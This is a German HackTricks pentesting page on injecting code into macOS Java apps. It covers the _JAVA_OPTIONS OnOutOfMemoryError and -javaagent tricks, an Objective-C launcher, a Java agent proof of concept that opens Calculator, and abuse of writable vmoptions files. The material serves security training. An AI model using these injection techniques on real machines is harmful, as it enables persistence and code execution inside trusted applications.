# Injektion in macOS-Java-Anwendungen

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

Finde die auf deinem System installierten Java-Anwendungen. Es wurde festgestellt, dass Java-Apps in der **Info.plist** einige Java-Parameter enthalten, die die Zeichenfolge **`java.`** enthalten. Daher kannst du danach suchen:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Die Umgebungsvariable **`_JAVA_OPTIONS`** kann verwendet werden, um beim Start einer Java-Anwendung beliebige Java-VM-Parameter einzuschleusen.<sup>[[1]](#references)</sup>
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Um es als neuen Prozess und nicht als untergeordneten Prozess des aktuellen Terminals auszuführen, können Sie Folgendes verwenden:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Allerdings löst diese Technik einen Fehler in der ausgeführten Anwendung aus. Eine unauffälligere Alternative besteht darin, einen Java agent zu erstellen und `-javaagent` zu verwenden:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> Das Erstellen des Agent mit einer **anderen Java-Version** als der Anwendung kann sowohl den Agent als auch die Anwendung zum Absturz bringen.

Der Agent kann sich befinden in:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Zum Kompilieren des Agents führen Sie Folgendes aus:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Mit `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Und exportiere anschließend die env-Variable und führe die Java-Anwendung wie folgt aus:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions-Datei

Diese Datei unterstützt die Angabe von **Java-Parametern**, wenn Java ausgeführt wird. Du kannst einige der zuvor beschriebenen Techniken verwenden, um die Java-Parameter zu ändern und **den Prozess beliebige Befehle ausführen zu lassen**.\
Darüber hinaus kann diese Datei mit der `include`-Direktive auch **andere Dateien einbinden**, sodass du ebenfalls eine eingebundene Datei ändern kannst.

Außerdem werden von einigen Java-Apps **mehr als eine `vmoptions`-Datei geladen**.

Einige Anwendungen, z. B. Android Studio, geben in ihrer **Ausgabe an, wo sie nach diesen Dateien suchen**:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Falls dies nicht der Fall ist, kannst du dies überprüfen mit:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Beachte, dass Android Studio in diesem Beispiel versucht, **`/Applications/Android Studio.app.vmoptions`** zu laden – ein Speicherort, auf den jeder Benutzer in der **`admin`-Gruppe Schreibzugriff hat**.

## References

- [1] [OpenJDK – `_JAVA_OPTIONS`-Parsing in `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java – Spezifikation des Pakets `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains – Konfigurieren von JVM-Optionen und Plattform-Eigenschaften](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
{{#include ../../../banners/hacktricks-training.md}}
